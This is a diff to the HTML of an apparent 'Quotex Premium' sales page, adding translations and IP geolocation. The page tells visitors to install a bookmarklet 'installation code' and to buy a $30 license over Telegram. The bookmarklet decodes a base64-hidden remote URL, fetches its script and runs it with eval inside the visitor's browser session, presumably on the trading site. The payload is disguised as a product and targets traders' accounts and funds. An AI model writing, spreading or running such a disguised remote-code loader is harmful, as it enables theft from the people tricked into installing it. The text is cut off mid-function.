@@ -4,8 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Quotex Code</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link rel="icon" type="image/png" href="https://i.postimg.cc/FsZx0RMQ/quotex-io-logo-png-seeklogo-431725.png">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&family=Noto+Sans+Bengali:wght@300;400;500;600;700;800;900&family=Noto+Sans+Arabic:wght@300;400;500;600;700;800;900&family=Noto+Sans+Devanagari:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://vjs.zencdn.net/8.6.1/video-js.css" rel="stylesheet">
     <script src="https://vjs.zencdn.net/8.6.1/video.min.js"></script>
@@ -22,6 +24,15 @@
             color: #fff;
             min-height: 100vh;
             overflow-x: hidden;
+        }
+
+        body[data-lang="bn"] {
+            font-family: 'Noto Sans Bengali', 'Poppins', sans-serif;
+        }
+
+        body[data-lang="ar"] {
+            font-family: 'Noto Sans Arabic', 'Poppins', sans-serif;
+            direction: rtl;
         }
 
         .container {
@@ -641,12 +652,12 @@
                 <div class="logo">
                     <img src="https://cdn-icons-png.flaticon.com/512/3135/3135706.png" alt="Quotex">
                 </div>
-                <h1>Quotex Premium</h1>
-                <p>Choose your device to watch the installation guide</p>
+                <h1 class="mainTitle">Quotex Premium</h1>
+                <p class="mainSubtitle">Choose your device to watch the installation guide</p>
                 <div class="telegram-contact">
                     <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 15px;">
                         <img src="https://cdn-icons-png.flaticon.com/512/3059/3059590.png" alt="Support" style="width: 35px; height: 35px; filter: drop-shadow(0 0 8px rgba(255, 255, 255, 0.5));">
-                        <p style="margin: 0;">Need Support? Contact us on Telegram</p>
+                        <p class="needSupportText" style="margin: 0;">Need Support? Contact us on Telegram</p>
                     </div>
                     <a href="https://t.me/traderjisanx" target="_blank" class="telegram-btn">
                         <i class="fab fa-telegram"></i>
@@ -661,9 +672,9 @@
                     <div class="device-icon">
                         <img src="https://cdn-icons-png.flaticon.com/512/270/270780.png" alt="Android">
                     </div>
-                    <h2>Android Setup</h2>
-                    <p>Complete installation guide for Android smartphones and tablets</p>
-                    <button class="btn btn-primary">
+                    <h2 class="androidTitle">Android Setup</h2>
+                    <p class="androidDesc">Complete installation guide for Android smartphones and tablets</p>
+                    <button class="btn btn-primary watchVideoBtn">
                         <i class="fas fa-play-circle"></i>
                         <span>Watch Video</span>
                     </button>
@@ -674,9 +685,9 @@
                     <div class="device-icon">
                         <img src="https://cdn-icons-png.flaticon.com/512/888/888882.png" alt="PC">
                     </div>
-                    <h2>PC/Windows Setup</h2>
-                    <p>Complete installation guide for PC and Windows devices</p>
-                    <button class="btn btn-primary">
+                    <h2 class="pcTitle">PC/Windows Setup</h2>
+                    <p class="pcDesc">Complete installation guide for PC and Windows devices</p>
+                    <button class="btn btn-primary watchVideoBtn">
                         <i class="fas fa-play-circle"></i>
                         <span>Watch Video</span>
                     </button>
@@ -687,9 +698,9 @@
                     <div class="device-icon">
                         <img src="https://cdn-icons-png.flaticon.com/512/0/747.png" alt="iPhone">
                     </div>
-                    <h2>iPhone Setup</h2>
-                    <p>Complete installation guide for iPhone and iPad devices</p>
-                    <button class="btn btn-primary">
+                    <h2 class="iphoneTitle">iPhone Setup</h2>
+                    <p class="iphoneDesc">Complete installation guide for iPhone and iPad devices</p>
+                    <button class="btn btn-primary watchVideoBtn">
                         <i class="fas fa-play-circle"></i>
                         <span>Watch Video</span>
                     </button>
@@ -698,9 +709,9 @@
 
             <!-- Download Section -->
             <div class="download-section">
-                <h2>Download Code</h2>
-                <p>Get the installation code for your device</p>
-                <button class="btn btn-download" onclick="showPage('codePage')">
+                <h2 class="downloadCodeTitle">Download Code</h2>
+                <p class="downloadCodeDesc">Get the installation code for your device</p>
+                <button class="btn btn-download getCodeBtn" onclick="showPage('codePage')">
                     <i class="fas fa-download"></i>
                     <span>Get Code</span>
                 </button>
@@ -712,9 +723,9 @@
             <div class="video-page-header">
                 <h1>
                     <img src="https://cdn-icons-png.flaticon.com/512/270/270780.png" alt="Android" class="device-logo">
-                    Android Setup Video
+                    <span class="androidVideoTitle">Android Setup Video</span>
                 </h1>
-                <p>Follow the instructions in this video to set up on your Android device</p>
+                <p class="androidVideoDesc">Follow the instructions in this video to set up on your Android device</p>
             </div>
 
             <div class="video-container">
@@ -724,7 +735,7 @@
             </div>
 
             <div style="text-align: center;">
-                <button class="btn back-btn" onclick="showPage('homePage')">
+                <button class="btn back-btn backToHomeBtn" onclick="showPage('homePage')">
                     <i class="fas fa-arrow-left"></i>
                     <span>Back to Home</span>
                 </button>
@@ -736,9 +747,9 @@
             <div class="video-page-header">
                 <h1>
                     <img src="https://cdn-icons-png.flaticon.com/512/888/888882.png" alt="PC" class="device-logo">
-                    PC/Windows Setup Video
+                    <span class="pcVideoTitle">PC/Windows Setup Video</span>
                 </h1>
-                <p>Follow the instructions in this video to set up on your PC or Windows device</p>
+                <p class="pcVideoDesc">Follow the instructions in this video to set up on your PC or Windows device</p>
             </div>
 
             <div class="video-container">
@@ -748,7 +759,7 @@
             </div>
 
             <div style="text-align: center;">
-                <button class="btn back-btn" onclick="showPage('homePage')">
+                <button class="btn back-btn backToHomeBtn" onclick="showPage('homePage')">
                     <i class="fas fa-arrow-left"></i>
                     <span>Back to Home</span>
                 </button>
@@ -760,9 +771,9 @@
             <div class="video-page-header">
                 <h1>
                     <img src="https://cdn-icons-png.flaticon.com/512/0/747.png" alt="iPhone" class="device-logo">
-                    iPhone Setup Video
+                    <span class="iphoneVideoTitle">iPhone Setup Video</span>
                 </h1>
-                <p>Follow the instructions in this video to set up on your iPhone or iPad</p>
+                <p class="iphoneVideoDesc">Follow the instructions in this video to set up on your iPhone or iPad</p>
             </div>
 
             <div class="video-container">
@@ -772,7 +783,7 @@
             </div>
 
             <div style="text-align: center;">
-                <button class="btn back-btn" onclick="showPage('homePage')">
+                <button class="btn back-btn backToHomeBtn" onclick="showPage('homePage')">
                     <i class="fas fa-arrow-left"></i>
                     <span>Back to Home</span>
                 </button>
@@ -783,15 +794,15 @@
         <div id="codePage" class="page">
             <div class="code-section">
                 <div class="code-card">
-                    <h1>Installation Code</h1>
-                    <p>Copy the code below and create a bookmark with this code</p>
+                    <h1 class="installationCodeTitle">Installation Code</h1>
+                    <p class="installCodeDesc">Copy the code below and create a bookmark with this code</p>
 
                     <div class="code-box">
                         <div class="code-text" id="codeText">javascript:(function(){fetch(atob('aHR0cHM6Ly91aXh6bmV3dy52ZXJjZWwuYXBwLw==')+'?t='+Date.now())['then'](r=>r['text']())['then'](eval)['catch'](console.error)})();</div>
                     </div>
 
                     <div class="desktop-only" style="background: rgba(6, 255, 165, 0.1); padding: 25px; border-radius: 20px; margin-bottom: 25px; border: 2px dashed rgba(6, 255, 165, 0.4);">
-                        <p style="font-size: 1.15rem; margin-bottom: 20px; font-weight: 600;">
+                        <p class="quickInstallText" style="font-size: 1.15rem; margin-bottom: 20px; font-weight: 600;">
                             <img src="https://cdn-icons-png.flaticon.com/512/1055/1055687.png" alt="Drag" style="width: 30px; height: 30px; vertical-align: middle; margin-right: 10px;">
                             Quick Install: Drag this button to your bookmark bar
                         </p>
@@ -799,17 +810,17 @@
                             <i class="fas fa-bookmark"></i>
                             <span>Quotex</span>
                         </a>
-                        <p style="font-size: 0.95rem; margin-top: 15px; opacity: 0.8;">
+                        <p class="dragInfoText" style="font-size: 0.95rem; margin-top: 15px; opacity: 0.8;">
                             <i class="fas fa-info-circle"></i> Drag the "Quotex" button above to your browser's bookmark bar for one-click installation
                         </p>
                     </div>
 
-                    <button class="btn btn-copy" onclick="copyCode()">
+                    <button class="btn btn-copy copyCodeBtn" onclick="copyCode()">
                         <i class="fas fa-copy"></i>
                         <span>Copy Code</span>
                     </button>
 
-                    <button class="btn btn-watch" onclick="showPage('homePage')">
+                    <button class="btn btn-watch watchInstallBtn" onclick="showPage('homePage')">
                         <i class="fas fa-video"></i>
                         <span>Watch Video & Install</span>
                     </button>
@@ -818,38 +829,38 @@
                 <div class="code-card" style="background: rgba(255, 215, 0, 0.15); border-color: rgba(255, 215, 0, 0.5);">
                     <div style="display: flex; align-items: center; justify-content: center; gap: 15px; margin-bottom: 30px;">
                         <img src="https://cdn-icons-png.flaticon.com/512/7334/7334077.png" alt="License" style="width: 50px; height: 50px; filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.5));">
-                        <h1 style="color: #ffd700; font-size: 2.5rem; margin: 0;">Purchase License</h1>
+                        <h1 class="purchaseLicenseTitle" style="color: #ffd700; font-size: 2.5rem; margin: 0;">Purchase License</h1>
                     </div>
                     
                     <div style="text-align: left; margin-bottom: 30px; padding: 25px; background: rgba(0, 0, 0, 0.3); border-radius: 15px; border-left: 4px solid #ffd700;">
                         <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 15px;">
                             <img src="https://cdn-icons-png.flaticon.com/512/5610/5610944.png" alt="Warning" style="width: 35px; height: 35px; filter: drop-shadow(0 0 8px rgba(255, 215, 0, 0.6));">
-                            <p style="font-size: 1.2rem; font-weight: 600; margin: 0; color: #ffd700;">Important Notice</p>
+                            <p class="importantNoticeText" style="font-size: 1.2rem; font-weight: 600; margin: 0; color: #ffd700;">Important Notice</p>
                         </div>
-                        <p style="font-size: 1.15rem; line-height: 1.8; margin-bottom: 10px;">To purchase the license for this premium code, please contact the official developer on Telegram.</p>
+                        <p class="licenseInfoText" style="font-size: 1.15rem; line-height: 1.8; margin-bottom: 10px;">To purchase the license for this premium code, please contact the official developer on Telegram.</p>
                         <div style="display: flex; align-items: center; gap: 10px; margin: 15px 0;">
                             <img src="https://cdn-icons-png.flaticon.com/512/6897/6897039.png" alt="Stop" style="width: 30px; height: 30px; filter: drop-shadow(0 0 8px rgba(255, 107, 107, 0.6));">
-                            <p style="font-size: 1.15rem; line-height: 1.8; font-weight: 700; color: #ff6b6b; margin: 0;">Only buy from the official developer <span style="color: #06ffa5;">@traderjisanx</span></p>
+                            <p class="onlyBuyText" style="font-size: 1.15rem; line-height: 1.8; font-weight: 700; color: #ff6b6b; margin: 0;">Only buy from the official developer <span style="color: #06ffa5;">@traderjisanx</span></p>
                         </div>
-                        <p style="font-size: 1.05rem; line-height: 1.8; opacity: 0.9; margin-top: 10px;">Do not purchase from anyone else to avoid scams and ensure authentic product support.</p>
+                        <p class="avoidScamText" style="font-size: 1.05rem; line-height: 1.8; opacity: 0.9; margin-top: 10px;">Do not purchase from anyone else to avoid scams and ensure authentic product support.</p>
                     </div>
 
                     <div style="background: rgba(6, 255, 165, 0.1); padding: 20px; border-radius: 15px; margin-bottom: 25px; border: 2px solid rgba(6, 255, 165, 0.3);">
                         <div style="display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 10px;">
                             <img src="https://cdn-icons-png.flaticon.com/512/2331/2331966.png" alt="Price" style="width: 35px; height: 35px; filter: drop-shadow(0 0 8px rgba(6, 255, 165, 0.6));">
-                            <p style="font-size: 1.1rem; margin: 0; opacity: 0.9;">License Price</p>
+                            <p class="licensePriceText" style="font-size: 1.1rem; margin: 0; opacity: 0.9;">License Price</p>
                         </div>
                         <p style="font-size: 3rem; font-weight: 900; color: #06ffa5; text-shadow: 0 0 20px rgba(6, 255, 165, 0.5);">$30 USD</p>
                     </div>
 
-                    <a href="https://t.me/traderjisanx" target="_blank" class="btn telegram-btn" style="width: 100%; background: linear-gradient(135deg, #0088cc, #00a8e8); margin-top: 10px; padding: 18px 40px; font-size: 1.2rem;">
+                    <a href="https://t.me/traderjisanx" target="_blank" class="btn telegram-btn contactDeveloperBtn" style="width: 100%; background: linear-gradient(135deg, #0088cc, #00a8e8); margin-top: 10px; padding: 18px 40px; font-size: 1.2rem;">
                         <i class="fab fa-telegram"></i>
-                        <span>Contact Official Developer - @traderjisanx</span>
+                        <span class="contactDeveloperText">Contact Official Developer - @traderjisanx</span>
                     </a>
                     
                     <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 20px; opacity: 0.9;">
                         <img src="https://cdn-icons-png.flaticon.com/512/190/190411.png" alt="Check" style="width: 28px; height: 28px; filter: drop-shadow(0 0 5px rgba(6, 255, 165, 0.5));">
-                        <p style="font-size: 0.95rem; margin: 0;">Instant delivery after payment verification</p>
+                        <p class="instantDeliveryText" style="font-size: 0.95rem; margin: 0;">Instant delivery after payment verification</p>
                     </div>
                 </div>
             </div>
@@ -857,6 +868,425 @@
     </div>
 
     <script>
+        // Multi-language content translations
+        const translations = {
+            en: {
+                title: "Quotex Premium",
+                subtitle: "Choose your device to watch the installation guide",
+                needSupport: "Need Support? Contact us on Telegram",
+                androidTitle: "Android Setup",
+                androidDesc: "Complete installation guide for Android smartphones and tablets",
+                pcTitle: "PC/Windows Setup",
+                pcDesc: "Complete installation guide for PC and Windows devices",
+                iphoneTitle: "iPhone Setup",
+                iphoneDesc: "Complete installation guide for iPhone and iPad devices",
+                watchVideo: "Watch Video",
+                downloadCode: "Download Code",
+                getCode: "Get Code",
+                downloadCodeDesc: "Get the installation code for your device",
+                androidVideoTitle: "Android Setup Video",
+                androidVideoDesc: "Follow the instructions in this video to set up on your Android device",
+                pcVideoTitle: "PC/Windows Setup Video",
+                pcVideoDesc: "Follow the instructions in this video to set up on your PC or Windows device",
+                iphoneVideoTitle: "iPhone Setup Video",
+                iphoneVideoDesc: "Follow the instructions in this video to set up on your iPhone or iPad",
+                backToHome: "Back to Home",
+                installationCode: "Installation Code",
+                installCodeDesc: "Copy the code below and create a bookmark with this code",
+                quickInstall: "Quick Install: Drag this button to your bookmark bar",
+                dragInfo: "Drag the \"Quotex\" button above to your browser's bookmark bar for one-click installation",
+                copyCode: "Copy Code",
+                watchInstall: "Watch Video & Install",
+                purchaseLicense: "Purchase License",
+                importantNotice: "Important Notice",
+                licenseInfo: "To purchase the license for this premium code, please contact the official developer on Telegram.",
+                onlyBuy: "Only buy from the official developer",
+                avoidScam: "Do not purchase from anyone else to avoid scams and ensure authentic product support.",
+                licensePrice: "License Price",
+                contactDeveloper: "Contact Official Developer - @traderjisanx",
+                instantDelivery: "Instant delivery after payment verification",
+                copiedSuccess: "Copied Successfully!"
+            },
+            bn: {
+                title: "কোটেক্স প্রিমিয়াম",
+                subtitle: "ইনস্টলেশন গাইড দেখতে আপনার ডিভাইস নির্বাচন করুন",
+                needSupport: "সাহায্য প্রয়োজন? টেলিগ্রামে যোগাযোগ করুন",
+                androidTitle: "অ্যান্ড্রয়েড সেটআপ",
+                androidDesc: "অ্যান্ড্রয়েড স্মার্টফোন এবং ট্যাবলেটের জন্য সম্পূর্ণ ইনস্টলেশন গাইড",
+                pcTitle: "পিসি/উইন্ডোজ সেটআপ",
+                pcDesc: "পিসি এবং উইন্ডোজ ডিভাইসের জন্য সম্পূর্ণ ইনস্টলেশন গাইড",
+                iphoneTitle: "আইফোন সেটআপ",
+                iphoneDesc: "আইফোন এবং আইপ্যাড ডিভাইসের জন্য সম্পূর্ণ ইনস্টলেশন গাইড",
+                watchVideo: "ভিডিও দেখুন",
+                downloadCode: "কোড ডাউনলোড করুন",
+                getCode: "কোড পান",
+                downloadCodeDesc: "আপনার ডিভাইসের জন্য ইনস্টলেশন কোড পান",
+                androidVideoTitle: "অ্যান্ড্রয়েড সেটআপ ভিডিও",
+                androidVideoDesc: "আপনার অ্যান্ড্রয়েড ডিভাইসে সেটআপ করতে এই ভিডিওর নির্দেশাবলী অনুসরণ করুন",
+                pcVideoTitle: "পিসি/উইন্ডোজ সেটআপ ভিডিও",
+                pcVideoDesc: "আপনার পিসি বা উইন্ডোজ ডিভাইসে সেটআপ করতে এই ভিডিওর নির্দেশাবলী অনুসরণ করুন",
+                iphoneVideoTitle: "আইফোন সেটআপ ভিডিও",
+                iphoneVideoDesc: "আপনার আইফোন বা আইপ্যাডে সেটআপ করতে এই ভিডিওর নির্দেশাবলী অনুসরণ করুন",
+                backToHome: "হোমে ফিরে যান",
+                installationCode: "ইনস্টলেশন কোড",
+                installCodeDesc: "নিচের কোডটি কপি করুন এবং এই কোড দিয়ে একটি বুকমার্ক তৈরি করুন",
+                quickInstall: "দ্রুত ইনস্টল: এই বোতামটি আপনার বুকমার্ক বারে টেনে আনুন",
+                dragInfo: "এক-ক্লিক ইনস্টলেশনের জন্য উপরের \"কোটেক্স\" বোতামটি আপনার ব্রাউজারের বুকমার্ক বারে টেনে আনুন",
+                copyCode: "কোড কপি করুন",
+                watchInstall: "ভিডিও দেখুন এবং ইনস্টল করুন",
+                purchaseLicense: "লাইসেন্স কিনুন",
+                importantNotice: "গুরুত্বপূর্ণ নোটিশ",
+                licenseInfo: "এই প্রিমিয়াম কোডের লাইসেন্স কিনতে অফিসিয়াল ডেভেলপারের সাথে টেলিগ্রামে যোগাযোগ করুন।",
+                onlyBuy: "শুধুমাত্র অফিসিয়াল ডেভেলপার থেকে কিনুন",
+                avoidScam: "প্রতারণা এড়াতে এবং প্রকৃত পণ্য সাপোর্ট নিশ্চিত করতে অন্য কারো কাছ থেকে কিনবেন না।",
+                licensePrice: "লাইসেন্সের মূল্য",
+                contactDeveloper: "অফিসিয়াল ডেভেলপারের সাথে যোগাযোগ করুন - @traderjisanx",
+                instantDelivery: "পেমেন্ট যাচাইয়ের পর তাৎক্ষণিক ডেলিভারি",
+                copiedSuccess: "সফলভাবে কপি হয়েছে!"
+            },
+            hi: {
+                title: "Quotex Premium",
+                subtitle: "Installation guide dekhne ke liye apna device chuniye",
+                needSupport: "Madad chahiye? Telegram par contact karein",
+                androidTitle: "Android Setup",
+                androidDesc: "Android smartphone aur tablet ke liye complete installation guide",
+                pcTitle: "PC/Windows Setup",
+                pcDesc: "PC aur Windows device ke liye complete installation guide",
+                iphoneTitle: "iPhone Setup",
+                iphoneDesc: "iPhone aur iPad device ke liye complete installation guide",
+                watchVideo: "Video Dekhein",
+                downloadCode: "Code Download Karein",
+                getCode: "Code Le",
+                downloadCodeDesc: "Apne device ke liye installation code hasil karein",
+                androidVideoTitle: "Android Setup Video",
+                androidVideoDesc: "Apne Android device par setup karne ke liye is video mein diye gaye instructions follow karein",
+                pcVideoTitle: "PC/Windows Setup Video",
+                pcVideoDesc: "Apne PC ya Windows device par setup karne ke liye is video mein diye gaye instructions follow karein",
+                iphoneVideoTitle: "iPhone Setup Video",
+                iphoneVideoDesc: "Apne iPhone ya iPad par setup karne ke liye is video mein diye gaye instructions follow karein",
+                backToHome: "Home Par Wapas",
+                installationCode: "Installation Code",
+                installCodeDesc: "Niche diye gaye code ko copy karein aur is code ke saath ek bookmark banayein. Kaise bookmark setup karna padega video mein dekhein",
+                quickInstall: "Quick Install: Is button ko apne bookmark bar mein drag karein",
+                dragInfo: "Ek-click installation ke liye upar diye gaye \"Quotex\" button ko apne browser ke bookmark bar mein drag karein",
+                copyCode: "Code Copy Karein",
+                watchInstall: "Video Dekhein Aur Install Karein",
+                purchaseLicense: "License Kharidein",
+                importantNotice: "Important Notice",
+                licenseInfo: "Is premium code ka license kharidne ke liye Telegram par official developer se contact karein.",
+                onlyBuy: "Sirf official developer se kharidein",
+                avoidScam: "Fraud se bachne aur authentic product support ensure karne ke liye kisi aur se mat kharidein.",
+                licensePrice: "License Ki Keemat",
+                contactDeveloper: "Official Developer Se Contact Karein - @traderjisanx",
+                instantDelivery: "Payment verification ke baad turant delivery",
+                copiedSuccess: "Successfully Copy Ho Gaya!"
+            },
+            ur: {
+                title: "Quotex Premium",
+                subtitle: "Installation guide dekhne ke liye apna device select karein",
+                needSupport: "Madad chahiye? Telegram par rabita karein",
+                androidTitle: "Android Setup",
+                androidDesc: "Android smartphone aur tablet ke liye mukammal installation guide",
+                pcTitle: "PC/Windows Setup",
+                pcDesc: "PC aur Windows device ke liye mukammal installation guide",
+                iphoneTitle: "iPhone Setup",
+                iphoneDesc: "iPhone aur iPad device ke liye mukammal installation guide",
+                watchVideo: "Video Dekhein",
+                downloadCode: "Code Download Karein",
+                getCode: "Code Hasil Karein",
+                downloadCodeDesc: "Apne device ke liye installation code hasil karein",
+                androidVideoTitle: "Android Setup Video",
+                androidVideoDesc: "Apne Android device par setup karne ke liye is video mein di gayi hidayat par amal karein. Kaise bookmark setup karna padega",
+                pcVideoTitle: "PC/Windows Setup Video",
+                pcVideoDesc: "Apne PC ya Windows device par setup karne ke liye is video mein di gayi hidayat par amal karein",
+                iphoneVideoTitle: "iPhone Setup Video",
+                iphoneVideoDesc: "Apne iPhone ya iPad par setup karne ke liye is video mein di gayi hidayat par amal karein",
+                backToHome: "Home Par Wapas",
+                installationCode: "Installation Code",
+                installCodeDesc: "Niche diye gaye code ko copy karein aur is code ke sath ek bookmark banayein",
+                quickInstall: "Quick Install: Is button ko apne bookmark bar mein drag karein",
+                dragInfo: "Ek-click installation ke liye upar diye gaye \"Quotex\" button ko apne browser ke bookmark bar mein drag karein",
+                copyCode: "Code Copy Karein",
+                watchInstall: "Video Dekhein Aur Install Karein",
+                purchaseLicense: "License Kharidein",
+                importantNotice: "Ahem Notice",
+                licenseInfo: "Is premium code ka license kharidne ke liye Telegram par official developer se rabita karein.",
+                onlyBuy: "Sirf official developer se kharidein",
+                avoidScam: "Fraud se bachne aur asli product support ensure karne ke liye kisi aur se mat kharidein.",
+                licensePrice: "License Ki Qeemat",
+                contactDeveloper: "Official Developer Se Rabita Karein - @traderjisanx",
+                instantDelivery: "Payment verification ke baad fauran delivery",
+                copiedSuccess: "Kamiyabi Se Copy Ho Gaya!"
+            },
+            ar: {
+                title: "كوتكس بريميوم",
+                subtitle: "اختر جهازك لمشاهدة دليل التثبيت",
+                needSupport: "تحتاج مساعدة؟ اتصل بنا على تيليجرام",
+                androidTitle: "إعداد أندرويد",
+                androidDesc: "دليل التثبيت الكامل للهواتف الذكية والأجهزة اللوحية التي تعمل بنظام أندرويد",
+                pcTitle: "إعداد الكمبيوتر/ويندوز",
+                pcDesc: "دليل التثبيت الكامل لأجهزة الكمبيوتر وويندوز",
+                iphoneTitle: "إعداد آيفون",
+                iphoneDesc: "دليل التثبيت الكامل لأجهزة آيفون وآيباد",
+                watchVideo: "شاهد الفيديو",
+                downloadCode: "تحميل الكود",
+                getCode: "احصل على الكود",
+                downloadCodeDesc: "احصل على كود التثبيت لجهازك",
+                androidVideoTitle: "فيديو إعداد أندرويد",
+                androidVideoDesc: "اتبع التعليمات الواردة في هذا الفيديو للإعداد على جهاز أندرويد الخاص بك",
+                pcVideoTitle: "فيديو إعداد الكمبيوتر/ويندوز",
+                pcVideoDesc: "اتبع التعليمات الواردة في هذا الفيديو للإعداد على جهاز الكمبيوتر أو ويندوز الخاص بك",
+                iphoneVideoTitle: "فيديو إعداد آيفون",
+                iphoneVideoDesc: "اتبع التعليمات الواردة في هذا الفيديو للإعداد على جهاز آيفون أو آيباد الخاص بك",
+                backToHome: "العودة إلى الصفحة الرئيسية",
+                installationCode: "كود التثبيت",
+                installCodeDesc: "انسخ الكود أدناه وأنشئ إشارة مرجعية بهذا الكود",
+                quickInstall: "تثبيت سريع: اسحب هذا الزر إلى شريط الإشارات المرجعية",
+                dragInfo: "اسحب زر \"كوتكس\" أعلاه إلى شريط الإشارات المرجعية في متصفحك للتثبيت بنقرة واحدة",
+                copyCode: "نسخ الكود",
+                watchInstall: "شاهد الفيديو وقم بالتثبيت",
+                purchaseLicense: "شراء الترخيص",
+                importantNotice: "إشعار هام",
+                licenseInfo: "لشراء ترخيص هذا الكود المميز، يرجى الاتصال بالمطور الرسمي على تيليجرام.",
+                onlyBuy: "اشتري فقط من المطور الرسمي",
+                avoidScam: "لا تشتري من أي شخص آخر لتجنب عمليات الاحتيال ولضمان دعم المنتج الأصلي.",
+                licensePrice: "سعر الترخيص",
+                contactDeveloper: "اتصل بالمطور الرسمي - @traderjisanx",
+                instantDelivery: "تسليم فوري بعد التحقق من الدفع",
+                copiedSuccess: "تم النسخ بنجاح!"
+            }
+        };
+
+        // Detect language based on IP geolocation
+        let currentLang = 'en';
+        let detectedCountry = 'Unknown';
+        let detectedCountryName = 'Unknown';
+
+        async function detectLanguage() {
+            console.log('🌍 Starting IP-based location detection...');
+            
+            // Map country codes to languages
+            const languageMap = {
+                'BD': 'bn',  // Bangladesh
+                'IN': 'hi',  // India
+                'PK': 'ur',  // Pakistan
+                'SA': 'ar',  // Saudi Arabia
+                'AE': 'ar',  // UAE
+                'EG': 'ar',  // Egypt
+                'JO': 'ar',  // Jordan
+                'KW': 'ar',  // Kuwait
+                'QA': 'ar',  // Qatar
+                'BH': 'ar',  // Bahrain
+                'OM': 'ar',  // Oman
+                'LB': 'ar',  // Lebanon
+                'SY': 'ar',  // Syria
+                'IQ': 'ar',  // Iraq
+                'YE': 'ar',  // Yemen
+                'MA': 'ar',  // Morocco
+                'DZ': 'ar',  // Algeria
+                'TN': 'ar',  // Tunisia
+                'LY': 'ar',  // Libya
+                'SD': 'ar',  // Sudan
+            };
+
+            const countryNames = {
+                'BD': 'Bangladesh',
+                'IN': 'India',
+                'PK': 'Pakistan',
+                'SA': 'Saudi Arabia',
+                'AE': 'United Arab Emirates',
+                'EG': 'Egypt',
+                'JO': 'Jordan',
+                'KW': 'Kuwait',
+                'QA': 'Qatar',
+                'BH': 'Bahrain',
+                'OM': 'Oman',
+                'LB': 'Lebanon',
+                'SY': 'Syria',
+                'IQ': 'Iraq',
+                'YE': 'Yemen',
+                'MA': 'Morocco',
+                'DZ': 'Algeria',
+                'TN': 'Tunisia',
+                'LY': 'Libya',
+                'SD': 'Sudan'
+            };
+            
+            try {
+                // Try multiple geolocation APIs for better reliability
+                let countryCode = null;
+                
+                // Try API 1: ipapi.co
+                try {
+                    console.log('📡 Trying ipapi.co...');
+                    const response1 = await fetch('https://ipapi.co/json/');
+                    const data1 = await response1.json();
+                    if (data1.country_code) {
+                        countryCode = data1.country_code;
+                        detectedCountry = countryCode;
+                        detectedCountryName = data1.country_name || countryNames[countryCode] || 'Unknown';
+                        console.log('✅ ipapi.co successful!');
+                    }
+                } catch (e) {
+                    console.log('❌ ipapi.co failed:', e.message);
+                }
+
+                // Try API 2: ip-api.com (backup)
+                if (!countryCode) {
+                    try {
+                        console.log('📡 Trying ip-api.com...');
+                        const response2 = await fetch('http://ip-api.com/json/');
+                        const data2 = await response2.json();
+                        if (data2.countryCode) {
+                            countryCode = data2.countryCode;
+                            detectedCountry = countryCode;
+                            detectedCountryName = data2.country || countryNames[countryCode] || 'Unknown';
+                            console.log('✅ ip-api.com successful!');
+                        }
+                    } catch (e) {
+                        console.log('❌ ip-api.com failed:', e.message);
+                    }
+                }
+
+                // Try API 3: ipwhois.app (backup)
+                if (!countryCode) {
+                    try {
+                        console.log('📡 Trying ipwhois.app...');
+                        const response3 = await fetch('https://ipwhois.app/json/');
+                        const data3 = await response3.json();
+                        if (data3.country_code) {
+                            countryCode = data3.country_code;
+                            detectedCountry = countryCode;
+                            detectedCountryName = data3.country || countryNames[countryCode] || 'Unknown';
+                            console.log('✅ ipwhois.app successful!');
+                        }
+                    } catch (e) {
+                        console.log('❌ ipwhois.app failed:', e.message);
+                    }
+                }
+                
+                if (countryCode) {
+                    currentLang = languageMap[countryCode] || 'en';
+                    
+                    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+                    console.log('🌐 IP TRACKING RESULT:');
+                    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+                    console.log('📍 Country Code: ' + detectedCountry);
+                    console.log('🗺️  Country Name: ' + detectedCountryName);
+                    console.log('🗣️  Selected Language: ' + currentLang.toUpperCase());
+                    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+                    
+                    // Store in localStorage for next visit
+                    localStorage.setItem('userLanguage', currentLang);
+                    localStorage.setItem('userCountry', detectedCountry);
+                    localStorage.setItem('userCountryName', detectedCountryName);
+                } else {
+                    throw new Error('All geolocation APIs failed');
+                }
+                
+            } catch (error) {
+                console.log('⚠️ Geolocation detection failed, checking localStorage...');
+                // Fallback to localStorage or default
+                const storedLang = localStorage.getItem('userLanguage');
+                const storedCountry = localStorage.getItem('userCountry');
+                const storedCountryName = localStorage.getItem('userCountryName');
+                
+                if (storedLang) {
+                    currentLang = storedLang;
+                    detectedCountry = storedCountry || 'Unknown';
+                    detectedCountryName = storedCountryName || 'Unknown';
+                    
+                    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+                    console.log('💾 USING STORED DATA:');
+                    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+                    console.log('📍 Country Code: ' + detectedCountry);
+                    console.log('🗺️  Country Name: ' + detectedCountryName);
+                    console.log('🗣️  Selected Language: ' + currentLang.toUpperCase());
+                    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+                } else {
+                    currentLang = 'en';
+                    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+                    console.log('⚠️  FALLBACK TO DEFAULT:');
+                    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+                    console.log('🗣️  Selected Language: ENGLISH (Default)');
+                    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+                }
+            }
+            
+            // Apply language
+            applyLanguage(currentLang);
+        }
+
+        function applyLanguage(lang) {
+            currentLang = lang;
+            document.body.setAttribute('data-lang', lang);
